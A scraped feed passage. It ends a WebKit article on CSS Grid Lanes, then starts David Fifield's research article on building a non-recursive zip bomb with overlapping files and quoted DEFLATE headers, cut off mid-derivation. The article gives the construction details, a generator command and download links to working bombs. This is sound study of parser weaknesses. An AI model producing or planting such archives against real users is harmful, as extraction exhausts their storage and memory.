<figure><picture><source srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-dark.png" type="image/png" media="(prefers-color-scheme: dark)"><img loading="lazy" decoding="async" src="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light.png" alt="A layout of 15 groups of links. Each has between two and nine links in the group —&nbsp;so they are all very different heights from each other. The layout has five columns of these groups, where each group just comes right after the group above it. Without any regard for rows.  " width="2000" height="1164" srcset="https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light.png 2000w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-300x175.png 300w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-1024x596.png 1024w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-768x447.png 768w, https://webkit.org/wp-content/uploads/Grid-Lanes-mega-menu-light-1536x894.png 1536w" sizes="auto, (max-width: 2000px) 100vw, 2000px"></picture><figcaption>Try out the <a href="https://webkit.org/demos/grid3/megamenu/">mega menu demo</a> today in Safari Technology Preview.</figcaption></figure>
<pre><code><span>.container</span> {
  <span>display</span>: <span>grid-lanes</span>;
  <span>grid-template-columns</span>: <span>repeat</span>(<span>auto-fill</span>, <span>minmax</span>(<span>max-content</span>, <span>24</span><span>ch</span>));
  <span>column-gap</span>: <span>4</span><span>lh</span>;
}
</code></pre>
<h2>What’s next?</h2>
<p>There are a few last decisions for the CSS Working Group to make. But overall, the feature as described in this article is ready to go. It’s time to try it out. And it’s finally safe to commit the basic syntax to memory!</p>
<p>We’d love for you to make some demos! Demonstrate what new use cases you can imagine. And let us know about any bugs or possible improvements you discover. Ping Jen Simmons on <a href="https://bsky.app/profile/jensimmons.bsky.social">Bluesky</a> or <a href="https://front-end.social/@jensimmons">Mastodon</a> with links, comments and ideas.</p>
<p>Our team has been working on this since mid-2022, implementing in WebKit and writing the web standard. We can’t wait to see what you will do with it.</p>

                            </div>
        </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A Better Zip Bomb (162 pts)]]></title>
            <link>https://www.bamsoftware.com/hacks/zipbomb/</link>
            <guid>46331216</guid>
            <pubDate>Fri, 19 Dec 2025 21:34:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bamsoftware.com/hacks/zipbomb/">https://www.bamsoftware.com/hacks/zipbomb/</a>, See on <a href="https://news.ycombinator.com/item?id=46331216">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>

<header>


<address id="contact">
<p>
David Fifield<br>
<a href="mailto:david@bamsoftware.com">david@bamsoftware.com</a>
</p>
</address>

<p>
<time>2019-07-02</time>
<small>updated <time>2019-07-03</time>, <time>2019-07-05</time>, <time>2019-07-06</time>, <time>2019-07-08</time>,
<time>2019-07-18</time>, <time>2019-07-20</time>, <time>2019-07-22</time>, <time>2019-07-24</time>,
<time>2019-08-05</time>, <time>2019-08-19</time>, <time>2019-08-22</time>, <time>2019-10-14</time>,
<time>2019-10-18</time>, <time>2019-10-30</time>, <a href="#xfinity"><time>2019-11-28</time></a>,
<a href="#flytech"><time>2020-07-28</time></a>, <time>2021-01-21</time>, <time>2021-02-02</time>,
<a href="#ios"><time>2021-05-03</time></a>, <time>2021-07-29</time>,
<a href="#42.zip-tld"><time>2023-05-18</time></a>
</small>
</p>
</header>

<section id="summary">
<h2>Summary</h2>

<p>
This article shows how to construct a
<em>non-recursive</em> <a href="https://en.wikipedia.org/wiki/Zip_bomb">zip bomb</a>
that achieves a high compression ratio by
overlapping files inside the zip container.
"Non-recursive" means that it does not rely on
a decompressor's recursively unpacking zip files nested within zip files:
it expands fully after a single round of decompression.
The output size increases quadratically in the input size,
reaching a compression ratio of over <data value="28442385.9286689">28&nbsp;million</data>
(<data value="9893525">10&nbsp;<abbr title="megabyte">MB</abbr></data> → <data value="281395456244934">281&nbsp;<abbr title="terabyte">TB</abbr></data>)
at the limits of the zip format.
Even greater expansion is possible using
64-bit extensions.
The construction uses only the most common compression algorithm, DEFLATE,
and is compatible with most zip parsers.
</p>



<dl id="source">
<dt>Source code:</dt>
<dd>
<pre>git clone https://www.bamsoftware.com/git/zipbomb.git</pre>
<a href="https://www.bamsoftware.com/hacks/zipbomb/zipbomb-20210121.zip">zipbomb-20210121.zip</a>
</dd>
<dt>Data and source for figures:</dt>
<dd>
<pre>git clone https://www.bamsoftware.com/git/zipbomb-paper.git</pre>
</dd>
</dl>

<p>
<a href="https://www.bamsoftware.com/talks/woot19-zipbomb/">Presentation video</a>
</p>

<p>
<a href="https://habr.com/ru/post/459254/">Русский перевод</a> от <a href="https://habr.com/en/users/m1rko/">@m1rko</a>.
</p>
<p>
<a href="https://zerosun.top/2019/07/07/A-better-zip-bomb/">中文翻译</a>: 北岸冷若冰霜.
</p>
<!-- https://blog.csdn.net/u013469753/article/details/106298143 -->
</section>

<section id="introduction">

<table id="comparison">

<!--
Uncompressed size of 42.zip not including intermediate files, only final 0.dll:
>>> 16*16*16*16*16*4294967295
4503599626321920
Uncompressed size of 42.zip including all intermediate files:
>>> 16*(34902 + 16*(29446 + 16*(32150 + 16*(165302 + 16*(4168266 + 4294967295)))))
4507981343026016
-->

<caption id="42-note">
<ul>
<li>
There are two versions of 42.zip,
an <a href="https://web.archive.org/web/20120222083624/http://www.unforgettable.dk/">older version</a> of <data value="42374">42 374</data> bytes,
and a <a href="https://web.archive.org/web/20120301154142/http://www.unforgettable.dk/">newer version</a> of <data value="42838">42 838</data> bytes.
The difference is that the newer version requires a password before unzipping.
We compare only against the older version.
Here is a copy if you need it:
<a href="https://www.bamsoftware.com/hacks/zipbomb/42.zip" download="">42.zip</a>.
</li>
</ul>

</caption>

<thead>
<tr>
<td colspan="2"></td>
<th colspan="2">non-recursive</th>
<th colspan="2">recursive</th>
</tr>
<tr>
<td></td>
<th>zipped size</th>
<th>unzipped size</th>
<th>ratio</th>
<th>unzipped size</th>
<th>ratio</th>
</tr>
</thead>

<tbody>
<tr>
<th><a href="https://research.swtch.com/zip">Cox quine</a></th>
<td><data value="440">440</data></td>
<td><data value="440">440</data></td>
<td><data value="1.0">1.0</data></td>
<td><data value="∞">∞</data></td>
<td><data value="∞">∞</data></td>
</tr>

<tr>
<th><a href="https://web.archive.org/web/20160130230432/http://www.steike.com/code/useless/zip-file-quine/">Ellingsen quine</a></th>
<td><data value="28809">28 809</data></td>
<td><data value="42569">42 569</data></td>
<td><data value="1.4776285188656322">1.5</data></td>
<td><data value="∞">∞</data></td>
<td><data value="∞">∞</data></td>
</tr>

<tr>
<th><a href="https://www.unforgettable.dk/">42.zip</a></th>
<td><a href="#42-note">*</a><data value="42374">42 374</data></td>
<td><data value="558432">558 432</data></td>
<td><data value="13.17864728371171">13.2</data></td>
<td><data value="4507981343026016">4 507 981 343 026 016</data></td>
<td><data value="106385551116.86449">106 billion</data></td>
</tr>

<tr>
<th>this technique</th>
<td><data value="42374">42 374</data></td>
<td><data value="5461307620">5 461 307 620</data></td>
<td><data value="128883.45730872705">129 thousand</data></td>
<td><data value="5461307620">5 461 307 620</data></td>
<td><data value="128883.45730872705">129 thousand</data></td>
</tr>

<tr>
<th>this technique</th>
<td><data value="9893525">9 893 525</data></td>
<td><data value="281395456244934">281 395 456 244 934</data></td>
<td><data value="28442385.9286689">28 million</data></td>
<td><data value="281395456244934">281 395 456 244 934</data></td>
<td><data value="28442385.9286689">28 million</data></td>
</tr>

<tr>
<th>this technique <small>(Zip64)</small></th>
<td><data value="45876952">45 876 952</data></td>
<td><data value="4507981427706459">4 507 981 427 706 459</data></td>
<td><data value="98262444.01996146">98 million</data></td>
<td><data value="4507981427706459">4 507 981 427 706 459</data></td>
<td><data value="98262444.01996146">98 million</data></td>
</tr>

<!--
<tr>
<th>this technique<br><small>(Zip64, less compatible)</small></th>
<td><data value="2961656712">2 961 656 712</data></td>
<td class=nonrec><data value="18446744085437447493">18 446 744 085 437 447 493</data></td>
<td class=nonrec><data value="6228522033.190134">6 billion</data></td>
<td class=rec><data value="18446744085437447493">18 446 744 085 437 447 493</data></td>
<td class=rec><data value="6228522033.190134">6 billion</data></td>
</tr>
-->

</tbody>

</table>





<p>
Compression bombs that use the zip format
must cope with the fact that DEFLATE,
the compression algorithm most commonly supported by zip parsers,
<a href="https://www.zlib.net/zlib_tech.html">cannot achieve</a> a compression ratio greater than 1032.
For this reason, zip bombs typically rely on recursive decompression,
nesting zip files within zip files to get an extra factor of 1032 with each layer.
But the trick only works on implementations that
unzip recursively, and most do not.
The best-known zip bomb,
<a href="https://www.unforgettable.dk/">42.zip</a>,
expands to a formidable <data value="4507981343026016">4.5&nbsp;<abbr title="petabyte">PB</abbr></data>
if all six of its layers are recursively unzipped,
but a trifling <data value="558432">0.6&nbsp;<abbr title="megabyte">MB</abbr></data> at the top layer.
Zip quines,
like those of <a href="https://web.archive.org/web/20160130230432/http://www.steike.com/code/useless/zip-file-quine/">Ellingsen</a>
and <a href="https://research.swtch.com/zip">Cox</a>,
which contain a copy of themselves
and thus expand infinitely if recursively unzipped,
are likewise perfectly safe to unzip once.
</p>

<p>
This article shows how to construct a non-recursive zip bomb
whose compression ratio surpasses the DEFLATE limit of 1032.
It works by overlapping files inside the zip container,
in order to reference a "kernel" of highly compressed data
in multiple files,
without making multiple copies of it.
The zip bomb's output size grows quadratically in the input size; i.e.,
the compression ratio gets better as the bomb gets bigger.
The construction depends on features of both zip and DEFLATE—it
is not directly portable to other file formats or compression algorithms.
It is compatible with most zip parsers,
the exceptions being "streaming" parsers that
parse in one pass without first consulting the zip file's central directory.
We try to balance
two conflicting goals:
</p>

<ul>
<li>
Maximize the compression ratio.
We define the compression ratio as the the sum of the sizes
of all the files contained the in the zip file,
divided by the size of the zip file itself.
It does not count filenames or other filesystem metadata,
only contents.
</li>
<li>
Be compatible.
Zip is a tricky format and parsers differ, especially
around edge cases and optional features.
Avoid taking advantage of tricks that only work with certain parsers.
We will remark on certain ways to increase the efficiency of the zip bomb
that come with some loss of compatibility.
</li>
</ul>

</section>

<section id="zip">
<h2>Structure of a zip file</h2>

<p>
A&nbsp;zip file consists of
a <em>central directory</em> which references
<em>files</em>.
</p>

<figure id="fig-normal">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/normal.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/normal.png" alt="A block diagram of the structure of a zip file. The central directory header consists of three central directory headers labeled CDH[1] (README), CDH[1] (Makefile), and CDH[3] (demo.c). The central directory headers point backwards to three local file headers LFH[1] (README), LFH[2] (Makefile), and LFH[3] (demo.c). Each local file header is joined with file data. The three joined blocks of (local file header, file data) are labeled file 1, file 2, and file 3.">
</picture>
</figure>

<p>
The central directory is at the end of the zip file.
It is a list of <em>central directory headers</em>.
Each central directory header contains metadata for a single file,
like its filename and CRC-32 checksum,
and a backwards pointer to a local file header.
A&nbsp;central directory header is 46&nbsp;bytes long,
plus the length of the filename.
</p>

<p>
A&nbsp;file consists of a <em>local file header</em>
followed by compressed <em>file data</em>.
The local file header is 30&nbsp;bytes long,
plus the length of the filename.
It contains a redundant copy
of the metadata from the central directory header,
and the compressed and uncompressed sizes of the file data
that follows.
Zip is a container format, not a compression algorithm.
Each file's data is compressed
using an algorithm specified in the metadata—usually <a href="https://tools.ietf.org/html/rfc1951">DEFLATE</a>.
</p>



<p>
This description of the zip format omits many details that
are not needed for understanding the zip bomb.
For full information,
refer to
<a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">section&nbsp;4.3 of APPNOTE.TXT</a>
or <a href="https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html">The structure of a PKZip file</a> by Florian Buchholz,
or see the <a href="#source">source code</a>.
</p>

</section>

<section id="overlap">
<h2>The first insight: overlapping files</h2>

<p>
By compressing a long string of repeated bytes,
we can produce a <em>kernel</em>
of highly compressed data.
By itself, the kernel's compression ratio cannot
exceed the DEFLATE limit of 1032,
so we want a way to reuse the kernel in many files,
without making a separate copy of it in each file.
We can do it by overlapping files:
making many central directory headers point to
a single file, whose data is the kernel.
</p>

<figure id="fig-overlap">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/overlap.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/overlap.png" alt="A block diagram of a zip file with fully overlapping files. The central directory header consists of central directory headers CDH[1], CDH[2], ..., CDH[N−1], CDH[N], with filenames A, B, ..., Y, Z. There is a single local file header LFH[1] with filename A whose file data is a compressed kernel. Every one of the central directory headers points backwards to the same local file header, LFH[1]. The lone file is multiply labeled file 1, file 2, ..., file N−1, file N.">
</picture>
</figure>

<p>
Let's look at an example to see how this construction affects the compression ratio.
Suppose the kernel is <data value="1000">1000&nbsp;bytes</data> and
decompresses to <data value="1000000">1&nbsp;<abbr title="megabyte">MB</abbr></data>.
Then the first <data value="1000000"><abbr title="megabyte">MB</abbr></data> of output "costs"
<data value="1078">1078&nbsp;bytes</data> of input:
</p>
<ul>
<li><data value="31">31&nbsp;bytes</data> for a local file header (including a 1-byte filename)</li>
<li><data value="47">47&nbsp;bytes</data> for a central directory header (including a 1-byte filename)</li>
<li><data value="1000">1000&nbsp;bytes</data> for the kernel itself</li>
</ul>
<p>
But every <data value="1000000">1&nbsp;<abbr title="megabyte">MB</abbr></data> of output
after the first costs only <data value="47">47&nbsp;bytes</data>—we don't need another local file header or another copy of the kernel,
only an additional central directory header.
So while the first reference of the kernel has a compression ratio of
1 000 000&nbsp;/&nbsp;1078 ≈&nbsp;928,
each additional reference pulls the ratio closer to
1 000 000&nbsp;/&nbsp;47 ≈&nbsp;21 277.
A&nbsp;bigger kernel raises the ceiling.
</p>

<p>
The problem with this idea is a lack of compatibility.
Because many central directory headers point to a single local file header,
the metadata—specifically the filename—cannot match for every file.
Some parsers <a href="#compatibility">balk at that</a>.
<a href="http://infozip.sourceforge.net/UnZip.html">Info-ZIP UnZip</a>
(the standard Unix <code>unzip</code> program)
extracts the files, but with warnings:
</p>
<figure>
<pre>$ <kbd>unzip overlap.zip</kbd>
<samp>  inflating: A
B:  mismatching "local" filename (A),
         continuing with "central" filename version
  inflating: B
<i>...</i></samp>
</pre>
</figure>
<p>
And the Python <a href="https://docs.python.org/3/library/zipfile.html">zipfile</a> module
<a href="https://github.com/python/cpython/blob/v3.7.0/Lib/zipfile.py#L1486-L1489">throws an exception</a>:
</p>
<figure>
<pre>$ <kbd>python3 -m zipfile -e overlap.zip .</kbd>
<samp>Traceback (most recent call last):
<i>...</i>
__main__.BadZipFile: File name in directory 'B' and header b'A' differ.</samp>
</pre>
</figure>
<!--
<p>
We could make every central directory header have the same filename
as the local file header, but that too is unsatisfying
because it means that if extracted to disk,
all the files will just overwrite each other and not take up more space
than a single file.
</p>
-->

<p>
Next we will see how to modify the construction
for consistency of filenames,
while still retaining most of the advantage
of overlapping files.
</p>

</section>

<section id="quote">
<h2>The second insight: quoting local file headers</h2>

<p>
We need to separate the local file headers for each file,
while still reusing a single kernel.
Simply concatenating all the local file headers does not work,
because the zip parser will find a local file header
where it expects to find the beginning of a DEFLATE stream.
But the idea will work, with a minor modification.
We'll use a feature of DEFLATE, non-compressed blocks,
to "quote" local file headers
so that they appear to be part of the same DEFLATE stream
that terminates in the kernel.
Every local file header
(except the first)
will be interpreted in two ways:
as code (part of the structure of the zip file)
and as data (part of the contents of a file).
</p>

<figure id="fig-quote">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/quote.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/quote.png" alt="A block diagram of a zip file with quoted local file headers. The central directory header consists of central directory headers CDH[1], CDH[2], ..., CDH[N−1], CDH[N], with filenames A, B, ..., Y, Z. The central directory headers point to corresponding local file headers LFH[1], LFH[2], ..., LFH[N−1], LFH[N] with filenames A, B, ..., Y, Z. The files are drawn and labeled to show that file 1 does not end before file 2 begins; rather file 1 contains file 2, file 2 contains file 3, and so on. There is a small green-colored space between LFH[1] and LFH[2], and between LFH[2] and LFH[3], etc., to stand for quoting the following local file header using an uncompressed DEFLATE block. The file data of the final file, whose local file header is LFH[N] and whose filename is Z, does not contain any other files, only the compressed kernel.">
</picture>
</figure>

<p>
A DEFLATE stream is a sequence of
<a href="https://tools.ietf.org/html/rfc1951#section-3.2.3">blocks</a>,
where each block may be compressed or non-compressed.
Compressed blocks are what we usually think of;
for example the kernel is one big compressed block.
But there are also non-compressed blocks,
which start with a
<a href="https://tools.ietf.org/html/rfc1951#section-3.2.4">5-byte header</a>
with a length field that means simply, "output the next <var>n</var> bytes verbatim."
Decompressing a non-compressed block means only stripping the 5-byte header.
Compressed and non-compressed blocks may be intermixed freely
in a DEFLATE stream.
The output is the concatenation of
decompressing all the blocks in order.
The "non-compressed" notion only has meaning at the DEFLATE layer;
the file data still counts as "compressed" at the zip layer,
no matter what kind of blocks are used.
</p>

<p>
It is easiest to understand this quoted-overlap construction from the inside out,
beginning with the last file and working backwards to the first.
Start by inserting the kernel, which will form the end of file data for every file.
Prepend a local file header LFH<sub><var>N</var></sub>
and add a central directory header CDH<sub><var>N</var></sub> that points to it.
Set the "compressed size" metadata field in the LFH<sub><var>N</var></sub> and CDH<sub><var>N</var></sub> to the compressed size of the kernel.
Now prepend a 5-byte non-compressed block header (colored green in the diagram)
whose length field is equal to the size of LFH<sub><var>N</var></sub>.
Prepend a second local file header LFH<sub><var>N</var>−1</sub>
and add a central directory header CDH<sub><var>N</var>−1</sub> that points to it.
Set the "compressed size" metadata field in both of the new headers to the compressed size of the kernel
<em>plus</em> the size of the non-compressed block header (5&nbsp;bytes)
<em>plus</em> the size of LFH<sub><var>N</var></sub>.
</p>



<p>
At this point the zip file contains two files, named "Y" and "Z".
Let's walk through what a zip parser would see while parsing it.
Suppose the compressed size of the kernel is 1000&nbsp;bytes
and the size of LFH<sub><var>N</var></sub> is 31&nbsp;bytes.
We start at CDH<sub><var>N</var>−1</sub>
and follow the pointer to LFH<sub><var>N</var>−1</sub>.
The first file's filename is "Y" and
the compressed size of its file data is 1036&nbsp;bytes.
Interpreting the next 1036 bytes as a DEFLATE stream,
we first encounter the 5-byte header of a non-compressed block
that says to copy the next 31&nbsp;bytes.
We write the next 31&nbsp;bytes,
which are LFH<sub><var>N</var></sub>,
which we decompress and append to file "Y".
Moving on in the DEFLATE stream, we find a compressed block (the kernel),
which we decompress to file "Y".
Now we have reached the end of the compressed data and are done with file "Y".
Proceeding to the next file, we follow the pointer from CDH<sub><var>N</var></sub>
to LFH<sub><var>N</var></sub> and find a file named "Z"
whose compressed size is 1000&nbsp;bytes.
Interpreting those 1000&nbsp;bytes as a DEFLATE stream,
we immediately encounter a compressed block (the kernel again)
and decompress it to the file "Z".
Now we have reached the end of the final file and are done.
The output file "Z" contains the decompressed kernel;
the output file "Y" is the same, but additionally prefixed by
the 31&nbsp;bytes of
LFH<sub><var>N</var></sub>.
</p>

<p>
We complete the construction by repeating the quoting procedure
until the zip file contains the desired number of files.
Each new file adds a central directory header,
a local file header,
and a non-compressed block to quote the immediately succeeding local file header.
Compressed file data is generally a chain of DEFLATE non-compressed blocks
(the quoted local file headers)
followed by the compressed kernel.
Each byte in the kernel contributes about
1032 <var>N</var> to the output size,
because each byte is part of all <var>N</var> files.
The output files are not all the same size:
those that appear earlier in the zip file
are larger than those that appear later,
because they contain more quoted local file headers.
The contents of the output files are not particularly meaningful,
but no one said they had to make sense.
</p>

<p>
This quoted-overlap construction has better compatibility
than the full-overlap construction of the previous section,
but the compatibility comes at the expense of the compression ratio.
There, each added file cost only a central directory header;
here, it costs a central directory header,
a local file header,
and another 5&nbsp;bytes for the quoting header.
</p>

<!--
<figure>
<pre>
File "A": compressed size 1900, uncompressed size 1000775
Non-compressed block header for the next 31 bytes
...
File "X": compressed size 1072, uncompressed size 1000062
Non-compressed block header for the next 31 bytes
File "Y": compressed size 1036, uncompressed size 1000031
Non-compressed block header for the next 31 bytes
File "Z": compressed size 1000, uncompressed size 1000000
Kernel
Central Directory Header "A"
...
Central Directory Header "X"
Central Directory Header "Y"
Central Directory Header "Z"
</pre>
</figure>
-->

</section>

<section id="optimization">
<h2>Optimization</h2>

<p>
Now that we have the basic zip bomb construction,
we will try to make it as efficient as possible.
We want to answer two questions:
</p>
<ul>
<li>For a given zip file size, what is the maximum compression ratio?</li>
<li>What is the maximum compression ratio, given the limits of the zip format?</li>
</ul>

<section id="bulkdeflate">
<h3>Kernel compression</h3>

<p>
It pays to compress the kernel as densely as possible,
because every decompressed byte gets magnified by a factor of <var>N</var>.
To that end, we use a custom DEFLATE compressor
called bulk_deflate,
specialized for compressing
a string of repeated bytes.
</p>

<!--
         engine compressed_size max_uncompressed_size
1: bulk_deflate           21090              21749401
2:         zlib           21090              21723602
3:       zopfli           21090              21734018
-->

<p>
All decent DEFLATE compressors will approach a compression ratio of 1032
when given an infinite stream of repeating bytes,
but we care more about specific finite sizes
than asymptotics.
bulk_deflate compresses more data
into the same space than the general-purpose compressors:
about 26&nbsp;kB more than zlib and Info-ZIP,
and about 15&nbsp;kB more than
<a href="https://github.com/google/zopfli">Zopfli</a>,
a compressor that trades speed for density.
</p>

<figure id="max_uncompressed_size">
<picture>
<source srcset="https://www.bamsoftware.com/hacks/zipbomb/max_uncompressed_size.svg" type="image/svg+xml">
<img src="https://www.bamsoftware.com/hacks/zipbomb/max_uncompressed_size.png" alt="A scatterplot showing the maximum uncompressed data for a given DEFLATE stream size, for four compression engines: bulk_deflate, Zopfli, zlib, and Info-ZIP. The points form three lines because zlib and Info-ZIP were identical. All three lines have a slope of 1032. For a given DEFLATE stream size, bulk_deflate compresses about 15 kB more than Zopfli, and Zopfli compresses about 10 kB more than zlib/Info-ZIP.">
</picture>
</figure>

<p>
The price of bulk_deflate's high compression ratio is a lack of generality.
bulk_deflate can only compress strings of a single repeated byte,
and only those of specific lengths,
namely 517&nbsp;+&nbsp;258 <var>k</var> for integer <var>k</var>&nbsp;≥&nbsp;0.
Besides compressing densely, bulk_deflate is fast,
doing essentially constant work regardless of the input size,
aside from the work of actually writing out the compressed string.
</p>

</section>

<section id="filenames">
<h3>Filenames</h3>



<p>
For our purposes, filenames are mostly dead weight.
While filenames do contribute something to the output size
by virtue of being part of quoted local file headers,
a byte in a filename does not contribute nearly as much
as a byte in the kernel.
We want filenames to be as short as possible,
while keeping them all distinct,
and subject to compatibility considerations.
</p>



<p>
The first compatibility consideration is character encoding.
The zip format specification states that filenames
are to be interpreted as <a href="https://en.wikipedia.org/wiki/Code_page_437">CP&nbsp;437</a>,
or <a href="https://en.wikipedia.org/wiki/UTF-8">UTF-8</a> if a certain flag bit is set
(<a href="https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT">APPNOTE.TXT Appendix&nbsp;D</a>).
But this is a major point of incompatibility
across zip parsers,
which may interpret filenames as being in
some fixed or locale-specific encoding.
So for compatibility, we must limit ourselves to characters
that have the same encoding in both
CP&nbsp;437 and UTF-8;
namely, the 95 printable characters of US-ASCII.
</p>



<p>
We are further restricted by filesystem naming limitations.
Some filesystems are case-insensitive, so "a" and "A" do not count as distinct names.
Common filesystems like FAT32
<a href="https://en.wikipedia.org/wiki/Comparison_of_file_systems#Limits">prohibit certain characters</a>
like '*' and '?'.
</p>

<p>
As a safe but not necessarily optimal compromise,
our zip bomb will use filenames consisting of characters
drawn from a 36-character alphabet
that does not
rely on case distinctions
or use special characters:
</p>
<figure>
0
1
2
3
4
5
6
7
8
9
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
</figure>
<p>
Filenames are generated in the obvious way,
cycling each position through the possible characters
and adding a position on overflow:
</p>
<figure>
"0", "1", "2", …, "Z",<br>
"00", "01", "02", …, "0Z",<br>
…,<br>
"Z0", "Z1", "Z2", …, "ZZ",<br>
"000", "001", "002", …
</figure>

<p>
There are 36 filenames of length&nbsp;1,
36<sup>2</sup> filenames of length&nbsp;2, and so on.
The length of the <var>n</var>th filename is
⌊log<sub>36</sub>((<var>n</var>&nbsp;+&nbsp;1)&nbsp;/&nbsp;(36 / 35))⌋&nbsp;+&nbsp;1.
<!--
The sum of the lengths of the first <var>n</var> filenames is
<var>d</var><var>n</var> − ((36<sup><var>d</var></sup> − 1) ⋅ (36 / 35<sup>2</sup>) − <var>d</var> / 35),
where <var>d</var> = &lfloor;log<sub>36</sub>(<var>n</var> / (36 / 35))&rfloor;.
-->
Four bytes are enough to represent
<data value="1727604">1 727 604</data> distinct filenames.
</p>

<p>
Given that the <var>N</var> filenames in the zip file
are generally not all of the same length,
which way should we order them,
shortest to longest or longest to shortest?
A&nbsp;little reflection shows that it is better to
put the longest names last, because those names are the most quoted.
Ordering filenames longest last
adds over <data value="929872440">900&nbsp;<abbr title="megabyte">MB</abbr></data> of output
to <a href="#allocation">zblg.zip</a>,
compared to ordering them longest first.
It is a minor optimization, though,
as those <data value="929872440">900&nbsp;<abbr title="megabyte">MB</abbr></data>
comprise only <data value="0.000003304504104">0.0003%</data>
of the total output size.
</p>

<!--
$ unzip -l zblg.zip | tail -n 1
281395456244934                     65534 files
$ unzip -l zblg.rev.zip | tail -n 1
281394526372494                     65534 files
$ python
>>> 281395456244934 - 281394526372494
929872440
>>> 929872440 / 281395456244934. * 100
0.00033045041039703735
-->

</section>

<section id="allocation">
<h3>Kernel size</h3>

<p>
The quoted-overlap construction
allows us to place a compressed kernel of data,
and then cheaply copy it many times.
For a given zip file size&nbsp;<var>X</var>,
how much space should we devote to storing the kernel,
and how much to making copies?
</p>

<p>
To find the optimum balance,
we only have to optimize the single variable <var>N</var>,
the number of files in the zip file.
Every value of <var>N</var> requires
a certain amount of overhead for
central directory headers,
local file headers,
quoting block headers, and filenames.
All the remaining space can be taken up by the kernel.
Because <var>N</var> has to be an integer,
and you can only fit so many files
before the kernel size drops to zero,
it suffices to test every possible value of <var>N</var>
and select the one that yields the most output.
</p>

<p>
Applying the optimization procedure to <var>X</var>&nbsp;=&nbsp;42 374,
the size of 42.zip,
finds a maximum at <var>N</var>&nbsp;=&nbsp;250.
Those 250 files require <data value="21195">21 195</data> bytes of overhead,
leaving <data value="21179">21 179</data> bytes for the kernel.
A&nbsp;kernel of that size decompresses to <data value="21841249">21 841 249</data> bytes
(a&nbsp;ratio of <data value="1031.2691345200435">1031.3</data>).
The 250 copies of the decompressed kernel,
plus the little bit extra that comes from the quoted local file headers,
produces an overall unzipped output of
5 461 307 620&nbsp;bytes
and a&nbsp;compression ratio of <data value="128883.45730872705">129&nbsp;thousand</data>.

</p><div id="download-zbsm">
<p><a href="https://www.bamsoftware.com/hacks/zipbomb/zbsm.zip" download=""><img src="https://www.bamsoftware.com/hacks/zipbomb/zip.png" alt=""> zbsm.zip</a>
<span><data value="42374">42&nbsp;<abbr title="kilobyte">kB</abbr></data>&nbsp;→&nbsp;<data value="5461307620">5.5&nbsp;<abbr title="gigabyte">GB</abbr></data></span></p><pre>zipbomb --mode=quoted_overlap --num-files=250 --compressed-size=21179 &gt; zbsm.zip</pre>
</div>

<p>
Optimization produced an almost even split
between the space allocated to the kernel
and the space allocated to file headers.
It is not a coincidence.
Let's look at a simplified model of the quoted-overlap construction.
In the simplified model,
we ignore filenames,
as well as the slight increase in output file size
due to quoting local file headers.
Analysis of the simplified model will show that the optimum
split between kernel and file headers is approximately even,
and that the output size grows quadratically
when allocation is optimal.
</p>

<p>
Define some constants and variables:
</p>

<figure>
<table>
<tbody><tr>
<td><var>X</var></td><td></td><td>zip file size (take as fixed)</td>
</tr>
<tr>
<td><var>N</var></td><td></td><td>number of files in the zip file (variable to optimize)</td>
</tr>
<tr>
<td>CDH</td><td>&nbsp;=&nbsp;46</td><td>size of a central directory header (without filename)</td>
</tr>
<tr>
<td>LFH</td><td>&nbsp;=&nbsp;30</td><td>size of a local file header (without filename)</td>
</tr>
<tr>
<td>Q</td><td>&nbsp;=&nbsp;5</td><td>the size of DEFLATE non-compressed block header</td>
</tr>
<tr>
<td>C</td><td>&nbsp;≈&nbsp;1032</td><td>compression ratio of the kernel</td>
</tr>
</tbody></table>
</figure>

<!--
JACAL session to do the algebra and calculus:

# S_X(N)
e1 : C * N * (X - (N * (LFH + CDH) + (N - 1) * Q)));
                                                  ^

                       2             2
e1: (- C CDH - C LFH) N  + (C N - C N ) Q + C N X

# S_X(N) as a polynomial in N
e2 : coeffs(e1, N);

e2: [0, C Q + C X, - C CDH - C LFH - C Q]

# S'_X(N)
e3 : diff(e1, N);

e3: (- 2 C CDH - 2 C LFH) N + (C - 2 C N) Q + C X

# S'_X(N) as a polynomial in N
e4 : coeffs(e3, N);

e4: [C Q + C X, - 2 C CDH - 2 C LFH - 2 C Q]

# Solve S'_X(N) = 0. e5 == N_OPT
e5 : suchthat(N, e3);

           Q + X
e5: - - - - - - - - - -
    2 CDH + 2 LFH + 2 Q

# H(N_OPT)
e6 : e5 * (LFH + CDH) + (e5 - 1) * Q;

    - Q + X
e6: - - - -
       2

# S_X(N_OPT)
e7 : -C * (CDH + LFH + Q) * e5^2 + C * (Q + X) * e5;

       2                2
    C Q  + 2 C Q X + C X
e7: - - - - - - - - - - -
     4 CDH + 4 LFH + 4 Q
-->

<p>
Let <var>H</var>(<var>N</var>)
be the amount of header overhead required by <var>N</var> files.
Refer to
<a href="#fig-quote">the diagram</a>
to understand where this formula comes from.
</p>

<figure>
<table>
<tbody><tr>
<td><var>H</var>(<var>N</var>)</td><td>&nbsp;= <var>N</var>&nbsp;⋅&nbsp;(CDH + LFH) + (<var>N</var>&nbsp;−&nbsp;1)&nbsp;⋅&nbsp;Q</td>
</tr>
</tbody></table>
</figure>

<p>
The space remaining for the kernel is
<var>X</var>&nbsp;−&nbsp;<var>H</var>(<var>N</var>).
The total unzipped size
<var>S</var><sub><var>X</var></sub>(<var>N</var>)
